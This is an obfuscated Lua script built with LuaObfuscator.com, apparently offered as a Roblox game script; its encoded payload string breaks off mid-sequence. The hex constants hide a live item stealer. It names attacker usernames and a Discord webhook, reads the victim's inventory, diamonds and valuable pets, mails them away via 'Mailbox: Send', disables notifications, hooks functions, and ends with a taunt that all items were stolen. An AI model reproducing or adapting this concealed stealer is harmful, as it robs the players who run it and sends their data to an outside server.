--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 81) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 64) then
					if (Enum <= 31) then
						if (Enum <= 15) then
							if (Enum <= 7) then
								if (Enum <= 3) then
									if (Enum <= 1) then
										if (Enum > 0) then
											Stk[Inst[2]] = Stk[Inst[3]] * Inst[4];
										elseif (Inst[2] <= Stk[Inst[4]]) then
											VIP = VIP + 1;
										else
											VIP = Inst[3];
										end
									elseif (Enum == 2) then
										local A = Inst[2];
										Top = (A + Varargsz) - 1;
										for Idx = A, Top do
											local VA = Vararg[Idx - A];
											Stk[Idx] = VA;
										end
									else
										Stk[Inst[2]][Inst[3]] = Inst[4];
									end
								elseif (Enum <= 5) then
									if (Enum > 4) then
										do
											return;
										end
									elseif (Inst[2] < Stk[Inst[4]]) then
										VIP = Inst[3];
									else
										VIP = VIP + 1;
									end
								elseif (Enum > 6) then
									if (Stk[Inst[2]] <= Stk[Inst[4]]) then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								else
									local B = Inst[3];
									local K = Stk[B];
									for Idx = B + 1, Inst[4] do
										K = K .. Stk[Idx];
									end
									Stk[Inst[2]] = K;
								end
							elseif (Enum <= 11) then
								if (Enum <= 9) then
									if (Enum > 8) then
										do
											return;
										end
									elseif (Stk[Inst[2]] ~= Stk[Inst[4]]) then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								elseif (Enum > 10) then
									local A = Inst[2];
									Stk[A] = Stk[A]();
								else
									local B = Stk[Inst[4]];
									if not B then
										VIP = VIP + 1;
									else
										Stk[Inst[2]] = B;
										VIP = Inst[3];
									end
								end
							elseif (Enum <= 13) then
								if (Enum > 12) then
									local A = Inst[2];
									local Results = {Stk[A](Unpack(Stk, A + 1, Top))};
									local Edx = 0;
									for Idx = A, Inst[4] do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
								else
									Stk[Inst[2]] = Stk[Inst[3]];
								end
							elseif (Enum > 14) then
								Stk[Inst[2]][Inst[3]] = Inst[4];
							elseif (Stk[Inst[2]] == Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 23) then
							if (Enum <= 19) then
								if (Enum <= 17) then
									if (Enum == 16) then
										local A = Inst[2];
										local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
										Top = (Limit + A) - 1;
										local Edx = 0;
										for Idx = A, Top do
											Edx = Edx + 1;
											Stk[Idx] = Results[Edx];
										end
									else
										Stk[Inst[2]] = Upvalues[Inst[3]];
									end
								elseif (Enum > 18) then
									if not Stk[Inst[2]] then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								else
									Stk[Inst[2]] = Wrap(Proto[Inst[3]], nil, Env);
								end
							elseif (Enum <= 21) then
								if (Enum == 20) then
									Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
								else
									Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								end
							elseif (Enum == 22) then
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							elseif (Stk[Inst[2]] ~= Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 27) then
							if (Enum <= 25) then
								if (Enum == 24) then
									local A = Inst[2];
									Stk[A] = Stk[A]();
								else
									Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
								end
							elseif (Enum > 26) then
								local A = Inst[2];
								local C = Inst[4];
								local CB = A + 2;
								local Result = {Stk[A](Stk[A + 1], Stk[CB])};
								for Idx = 1, C do
									Stk[CB + Idx] = Result[Idx];
								end
								local R = Result[1];
								if R then
									Stk[CB] = R;
									VIP = Inst[3];
								else
									VIP = VIP + 1;
								end
							else
								local B = Stk[Inst[4]];
								if not B then
									VIP = VIP + 1;
								else
									Stk[Inst[2]] = B;
									VIP = Inst[3];
								end
							end
						elseif (Enum <= 29) then
							if (Enum > 28) then
								Stk[Inst[2]] = Stk[Inst[3]] + Stk[Inst[4]];
							else
								do
									return Stk[Inst[2]];
								end
							end
						elseif (Enum > 30) then
							Stk[Inst[2]] = Inst[3] ~= 0;
							VIP = VIP + 1;
						elseif Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 47) then
						if (Enum <= 39) then
							if (Enum <= 35) then
								if (Enum <= 33) then
									if (Enum > 32) then
										for Idx = Inst[2], Inst[3] do
											Stk[Idx] = nil;
										end
									elseif (Stk[Inst[2]] == Stk[Inst[4]]) then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								elseif (Enum > 34) then
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								else
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
								end
							elseif (Enum <= 37) then
								if (Enum == 36) then
									Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								else
									Stk[Inst[2]] = {};
								end
							elseif (Enum > 38) then
								local A = Inst[2];
								local Cls = {};
								for Idx = 1, #Lupvals do
									local List = Lupvals[Idx];
									for Idz = 0, #List do
										local Upv = List[Idz];
										local NStk = Upv[1];
										local DIP = Upv[2];
										if ((NStk == Stk) and (DIP >= A)) then
											Cls[DIP] = NStk[DIP];
											Upv[1] = Cls;
										end
									end
								end
							elseif (Stk[Inst[2]] < Stk[Inst[4]]) then
								VIP = Inst[3];
							else
								VIP = VIP + 1;
							end
						elseif (Enum <= 43) then
							if (Enum <= 41) then
								if (Enum == 40) then
									VIP = Inst[3];
								else
									Env[Inst[3]] = Stk[Inst[2]];
								end
							elseif (Enum == 42) then
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							else
								Stk[Inst[2]] = #Stk[Inst[3]];
							end
						elseif (Enum <= 45) then
							if (Enum > 44) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Top));
								end
							else
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							end
						elseif (Enum == 46) then
							local A = Inst[2];
							Stk[A](Stk[A + 1]);
						else
							local A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
						end
					elseif (Enum <= 55) then
						if (Enum <= 51) then
							if (Enum <= 49) then
								if (Enum > 48) then
									local A = Inst[2];
									Stk[A](Unpack(Stk, A + 1, Top));
								else
									local A = Inst[2];
									local T = Stk[A];
									local B = Inst[3];
									for Idx = 1, B do
										T[Idx] = Stk[A + Idx];
									end
								end
							elseif (Enum > 50) then
								Stk[Inst[2]] = Stk[Inst[3]] + Stk[Inst[4]];
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 53) then
							if (Enum == 52) then
								Upvalues[Inst[3]] = Stk[Inst[2]];
							elseif (Stk[Inst[2]] == Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum == 54) then
							Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
						else
							Stk[Inst[2]] = Inst[3] ~= 0;
						end
					elseif (Enum <= 59) then
						if (Enum <= 57) then
							if (Enum == 56) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							else
								local A = Inst[2];
								local Results = {Stk[A](Unpack(Stk, A + 1, Top))};
								local Edx = 0;
								for Idx = A, Inst[4] do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum > 58) then
							do
								return Stk[Inst[2]]();
							end
						elseif (Inst[2] < Stk[Inst[4]]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 61) then
						if (Enum > 60) then
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 113) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						else
							local A = Inst[2];
							local Results = {Stk[A](Unpack(Stk, A + 1, Inst[3]))};
							local Edx = 0;
							for Idx = A, Inst[4] do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 62) then
						if (Stk[Inst[2]] < Stk[Inst[4]]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum > 63) then
						Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
					else
						local A = Inst[2];
						Stk[A](Stk[A + 1]);
					end
				elseif (Enum <= 96) then
					if (Enum <= 80) then
						if (Enum <= 72) then
							if (Enum <= 68) then
								if (Enum <= 66) then
									if (Enum > 65) then
										local A = Inst[2];
										do
											return Unpack(Stk, A, A + Inst[3]);
										end
									elseif (Stk[Inst[2]] <= Stk[Inst[4]]) then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								elseif (Enum > 67) then
									local B = Inst[3];
									local K = Stk[B];
									for Idx = B + 1, Inst[4] do
										K = K .. Stk[Idx];
									end
									Stk[Inst[2]] = K;
								else
									Stk[Inst[2]] = Stk[Inst[3]] * Stk[Inst[4]];
								end
							elseif (Enum <= 70) then
								if (Enum == 69) then
									Stk[Inst[2]] = Env[Inst[3]];
								else
									local A = Inst[2];
									Stk[A] = Stk[A](Stk[A + 1]);
								end
							elseif (Enum > 71) then
								Stk[Inst[2]] = #Stk[Inst[3]];
							else
								local A = Inst[2];
								local C = Inst[4];
								local CB = A + 2;
								local Result = {Stk[A](Stk[A + 1], Stk[CB])};
								for Idx = 1, C do
									Stk[CB + Idx] = Result[Idx];
								end
								local R = Result[1];
								if R then
									Stk[CB] = R;
									VIP = Inst[3];
								else
									VIP = VIP + 1;
								end
							end
						elseif (Enum <= 76) then
							if (Enum <= 74) then
								if (Enum == 73) then
									local A = Inst[2];
									do
										return Stk[A](Unpack(Stk, A + 1, Top));
									end
								elseif (Inst[2] < Stk[Inst[4]]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							elseif (Enum == 75) then
								if (Stk[Inst[2]] < Stk[Inst[4]]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								Env[Inst[3]] = Stk[Inst[2]];
							end
						elseif (Enum <= 78) then
							if (Enum == 77) then
								Stk[Inst[2]] = Inst[3];
							else
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							end
						elseif (Enum == 79) then
							Stk[Inst[2]]();
						elseif (Stk[Inst[2]] ~= Inst[4]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 88) then
						if (Enum <= 84) then
							if (Enum <= 82) then
								if (Enum == 81) then
									local A = Inst[2];
									local Results, Limit = _R(Stk[A](Stk[A + 1]));
									Top = (Limit + A) - 1;
									local Edx = 0;
									for Idx = A, Top do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
								else
									local A = Inst[2];
									Top = (A + Varargsz) - 1;
									for Idx = A, Top do
										local VA = Vararg[Idx - A];
										Stk[Idx] = VA;
									end
								end
							elseif (Enum > 83) then
								local A = Inst[2];
								local Results = {Stk[A](Unpack(Stk, A + 1, Inst[3]))};
								local Edx = 0;
								for Idx = A, Inst[4] do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							else
								local A = Inst[2];
								local Results = {Stk[A](Stk[A + 1])};
								local Edx = 0;
								for Idx = A, Inst[4] do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum <= 86) then
							if (Enum > 85) then
								Stk[Inst[2]] = Inst[3] ^ Stk[Inst[4]];
							elseif (Stk[Inst[2]] ~= Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum == 87) then
							Stk[Inst[2]] = Inst[3] ^ Stk[Inst[4]];
						else
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					elseif (Enum <= 92) then
						if (Enum <= 90) then
							if (Enum == 89) then
								Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
							else
								local A = Inst[2];
								local Results = {Stk[A](Stk[A + 1])};
								local Edx = 0;
								for Idx = A, Inst[4] do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum > 91) then
							Stk[Inst[2]] = Stk[Inst[3]] * Stk[Inst[4]];
						else
							Stk[Inst[2]] = Inst[3] ~= 0;
							VIP = VIP + 1;
						end
					elseif (Enum <= 94) then
						if (Enum > 93) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							Stk[Inst[2]] = Inst[3] ~= 0;
						end
					elseif (Enum > 95) then
						Stk[Inst[2]] = Env[Inst[3]];
					else
						local A = Inst[2];
						local B = Stk[Inst[3]];
						Stk[A + 1] = B;
						Stk[A] = B[Inst[4]];
					end
				elseif (Enum <= 112) then
					if (Enum <= 104) then
						if (Enum <= 100) then
							if (Enum <= 98) then
								if (Enum == 97) then
									if (Inst[2] < Stk[Inst[4]]) then
										VIP = Inst[3];
									else
										VIP = VIP + 1;
									end
								else
									local A = Inst[2];
									Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							elseif (Enum > 99) then
								do
									return Stk[Inst[2]]();
								end
							else
								Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
							end
						elseif (Enum <= 102) then
							if (Enum == 101) then
								if (Inst[2] <= Stk[Inst[4]]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								local NewProto = Proto[Inst[3]];
								local NewUvals;
								local Indexes = {};
								NewUvals = Setmetatable({}, {__index=function(_, Key)
									local Val = Indexes[Key];
									return Val[1][Val[2]];
								end,__newindex=function(_, Key, Value)
									local Val = Indexes[Key];
									Val[1][Val[2]] = Value;
								end});
								for Idx = 1, Inst[4] do
									VIP = VIP + 1;
									local Mvm = Instr[VIP];
									if (Mvm[1] == 113) then
										Indexes[Idx - 1] = {Stk,Mvm[3]};
									else
										Indexes[Idx - 1] = {Upvalues,Mvm[3]};
									end
									Lupvals[#Lupvals + 1] = Indexes;
								end
								Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
							end
						elseif (Enum == 103) then
							Stk[Inst[2]] = Stk[Inst[3]] * Inst[4];
						else
							Stk[Inst[2]] = Stk[Inst[3]] - Stk[Inst[4]];
						end
					elseif (Enum <= 108) then
						if (Enum <= 106) then
							if (Enum == 105) then
								do
									return Stk[Inst[2]];
								end
							else
								local A = Inst[2];
								local T = Stk[A];
								local B = Inst[3];
								for Idx = 1, B do
									T[Idx] = Stk[A + Idx];
								end
							end
						elseif (Enum == 107) then
							Upvalues[Inst[3]] = Stk[Inst[2]];
						else
							local A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
						end
					elseif (Enum <= 110) then
						if (Enum > 109) then
							if not Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					elseif (Enum == 111) then
						Stk[Inst[2]] = Stk[Inst[3]] - Stk[Inst[4]];
					elseif Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 120) then
					if (Enum <= 116) then
						if (Enum <= 114) then
							if (Enum == 113) then
								Stk[Inst[2]] = Stk[Inst[3]];
							elseif (Stk[Inst[2]] == Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum > 115) then
							Stk[Inst[2]] = Wrap(Proto[Inst[3]], nil, Env);
						elseif (Stk[Inst[2]] < Stk[Inst[4]]) then
							VIP = Inst[3];
						else
							VIP = VIP + 1;
						end
					elseif (Enum <= 118) then
						if (Enum > 117) then
							for Idx = Inst[2], Inst[3] do
								Stk[Idx] = nil;
							end
						else
							Stk[Inst[2]] = Upvalues[Inst[3]];
						end
					elseif (Enum > 119) then
						local A = Inst[2];
						do
							return Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					else
						Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
					end
				elseif (Enum <= 124) then
					if (Enum <= 122) then
						if (Enum == 121) then
							Stk[Inst[2]] = Inst[3];
						else
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Top));
						end
					elseif (Enum > 123) then
						Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
					else
						local A = Inst[2];
						local Cls = {};
						for Idx = 1, #Lupvals do
							local List = Lupvals[Idx];
							for Idz = 0, #List do
								local Upv = List[Idz];
								local NStk = Upv[1];
								local DIP = Upv[2];
								if ((NStk == Stk) and (DIP >= A)) then
									Cls[DIP] = NStk[DIP];
									Upv[1] = Cls;
								end
							end
						end
					end
				elseif (Enum <= 126) then
					if (Enum == 125) then
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
					else
						Stk[Inst[2]] = {};
					end
				elseif (Enum <= 127) then
					local A = Inst[2];
					local T = Stk[A];
					for Idx = A + 1, Inst[3] do
						Insert(T, Stk[Idx]);
					end
				elseif (Enum == 128) then
					local A = Inst[2];
					local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
					Top = (Limit + A) - 1;
					local Edx = 0;
					for Idx = A, Top do
						Edx = Edx + 1;
						Stk[Idx] = Results[Edx];
					end
				else
					Stk[Inst[2]]();
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!693Q0003083Q00557365726E616D6503103Q0046726561736879626F793132383Q3703093Q00557365726E616D6532030F3Q0046726561736879626F79313238373103073Q00776562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31333137323634352Q333238363238393437392F5146733233363845366A532D534D735A77734D6D46516E396F73644B676D71624B3977376E6B556A723452616C77596F515A344551587971495A37507645674679334F3203073Q006D696E5F726170024Q0080841E4103023Q005F47030E3Q0073637269707445786563757465642Q0103043Q0067616D65030A3Q004765745365727669636503113Q005265706C69636174656453746F72616765030C3Q0057616974466F724368696C6403073Q004E6574776F726B03073Q007265717569726503073Q004C69627261727903063Q00436C69656E7403043Q00536176652Q033Q0047657403093Q00496E76656E746F727903163Q004D61696C626F7853656E647353696E6365526573657403073Q00506C6179657273030B3Q004C6F63616C506C61796572030F3Q002Q47202F2047593252565345474454030B3Q00482Q747053657276696365028Q00025Q0088D34003043Q006D61746803043Q006365696C026Q00F83F026Q00F03F03053Q00706169727303083Q0043752Q72656E637903023Q00696403083Q004469616D6F6E64732Q033Q005F616D030B3Q006C65616465727374617473030D3Q00F09F928E204469616D6F6E647303053Q0056616C756503183Q0047657450726F70657274794368616E6765645369676E616C03073Q00436F2Q6E656374030D3Q00506C617965725363726970747303073Q005363726970747303043Q00436F726503133Q0050726F63652Q732050656E64696E672047554903093Q00506C61796572477569030D3Q004E6F74696669636174696F6E7303083Q0044697361626C656403073Q00456E61626C65640100030F3Q0044657363656E64616E74412Q6465642Q033Q005065742Q033Q00452Q6703053Q00436861726D03073Q00456E6368616E7403063Q00506F74696F6E03043Q004D697363030A3Q00486F766572626F61726403053Q00422Q6F746803083Q00556C74696D6174650003093Q004469726563746F727903043Q005065747303043Q0068756765030E3Q006578636C75736976654C6576656C034Q0003023Q00707403073Q00476F6C64656E20027Q004003083Q005261696E626F772003023Q00736803063Q005368696E792003053Q007461626C6503063Q00696E7365727403083Q0063617465676F72792Q033Q0075696403063Q00616D6F756E742Q033Q0072617003043Q006E616D652Q033Q005F6C6B03113Q004C6F636B696E675F5365744C6F636B6564030C3Q00496E766F6B6553657276657203063Q00756E7061636B030D3Q004D61696C626F783A2053656E6403063Q0069706169727303053Q00676574676303063Q00747970656F6603083Q0066756E6374696F6E03053Q00646562756703043Q00696E666F03013Q006E030C3Q00682Q6F6B66756E6374696F6E030B3Q0044617963617265436D647303053Q00436C61696D03143Q004578636C757369766544617963617265436D647303083Q00642Q6570436F707903043Q00736F727403053Q00737061776E03073Q004D652Q7361676503053Q00452Q726F72036B3Q00412Q4C20594F55522056414C5541424C45204954454D5320474F542053544F4C454E2C20494620552057414E5420544F204841564520524556454E4745204A4F494E204F555220444953434F5244205345525645522028636F7069656420746F20636C6970626F61726429030C3Q00736574636C6970626F61726403163Q00646973636F72642E2Q672F736B61697363726970747300CF012Q0012793Q00023Q0012293Q00013Q0012793Q00043Q0012293Q00033Q0012793Q00063Q0012293Q00053Q0012793Q00083Q0012293Q00073Q0012603Q00093Q001260000100093Q00201600010001000A00066E0001000E000100010004283Q000E00012Q003700015Q0010243Q000A00010012603Q00093Q0020165Q000A00061E3Q001400013Q0004283Q001400012Q00093Q00013Q0012603Q00093Q0030033Q000A000B0012603Q000C3Q00202C5Q000D0012790002000E4Q00583Q0002000200202C5Q000F001279000200104Q00583Q00020002001260000100113Q0012600002000C3Q00201600020002000E0020160002000200122Q002F000100020002001260000200113Q0012600003000C3Q00202C00030003000D0012790005000E4Q005800030005000200202C00030003000F001279000500124Q005800030005000200202C00030003000F001279000500134Q005800030005000200202C00030003000F001279000500144Q0080000300054Q007D00023Q00020020160002000200152Q000B000200010002002016000200020016001260000300113Q0012600004000C3Q00202C00040004000D0012790006000E4Q005800040006000200202C00040004000F001279000600124Q005800040006000200202C00040004000F001279000600134Q005800040006000200202C00040004000F001279000600144Q0080000400064Q007D00033Q00020020160003000300152Q000B0003000100020020160003000300170012600004000C3Q0020160004000400180020160004000400190012790005001A3Q0012600006000C3Q00202C00060006000D0012790008001B4Q00580006000800022Q007E00075Q0012790008001C4Q003700095Q000212000A5Q001279000B001D3Q0026170003005B0001001C0004283Q005B0001001260000C001E3Q002016000C000C001F001056000D002000032Q0043000D000B000D2Q002F000C000200022Q000C000B000C3Q001279000C00213Q001260000D00224Q000C000E000A4Q000B000E00010002002016000E000E0016002016000E000E00232Q0053000D0002000F0004283Q0068000100201600120011002400263500120068000100250004283Q00680001002016000C001100260004283Q006A000100061B000D0063000100020004283Q0063000100063E000C006D0001000B0004283Q006D00012Q00093Q00013Q000212000D00013Q000666000E0002000100052Q00713Q00074Q00713Q000D4Q00713Q00084Q00713Q00094Q00713Q00063Q002016000F00040027002016000F000F0028002016000F000F002900201600100004002700201600100010002800202C00110010002A001279001300294Q005800110013000200202C00110011002B00066600130003000100022Q00713Q00104Q00713Q000F4Q006200110013000100201600110004002C00201600110011002D00201600110011002E00201600110011002F00201600120004003000201600120012003100300300110032000B00202C00130012002A001279001500334Q005800130015000200202C00130013002B00066600150004000100012Q00713Q00124Q00620013001500010030030012003300340012600013000C3Q00201600130013003500202C00130013002B000212001500054Q006200130015000100066600130006000100012Q00713Q00063Q001260001400013Q001260001500033Q00066600160007000100062Q00713Q00144Q00713Q00054Q00718Q00713Q00154Q00713Q000C4Q00713Q000B3Q00066600170008000100062Q00713Q000A4Q00713Q000C4Q00713Q000B4Q00713Q00144Q00713Q00054Q00717Q00066600180009000100022Q00713Q00024Q00717Q0006660019000A000100022Q00713Q00024Q00717Q000666001A000B000100012Q00718Q007E001B00093Q001279001C00363Q001279001D00373Q001279001E00383Q001279001F00393Q0012790020003A3Q0012790021003B3Q0012790022003C3Q0012790023003D3Q0012790024003E4Q0030001B00090001001260001C00224Q000C001D001B4Q0053001C0002001E0004283Q00392Q012Q007C002100020020002617002100392Q01003F0004283Q00392Q01001260002100224Q007C0022000200202Q00530021000200230004283Q00372Q010026350020000D2Q0100360004283Q000D2Q01001260002600113Q0012600027000C3Q00202C00270027000D0012790029000E4Q00580027002900020020160027002700120020160027002700400020160027002700412Q002F0026000200020020160027002500242Q007C00260026002700201600270026004200066E002700D8000100010004283Q00D8000100201600270026004300061E002700292Q013Q0004283Q00292Q012Q000C002700134Q000C002800204Q000C002900254Q0058002700290002001260002800073Q000607002800292Q0100270004283Q00292Q01001279002800443Q00201600290025004500061E002900E800013Q0004283Q00E80001002016002900250045002635002900E8000100210004283Q00E80001001279002800463Q0004283Q00EF000100201600290025004500061E002900EF00013Q0004283Q00EF0001002016002900250045002635002900EF000100470004283Q00EF0001001279002800483Q00201600290025004900061E00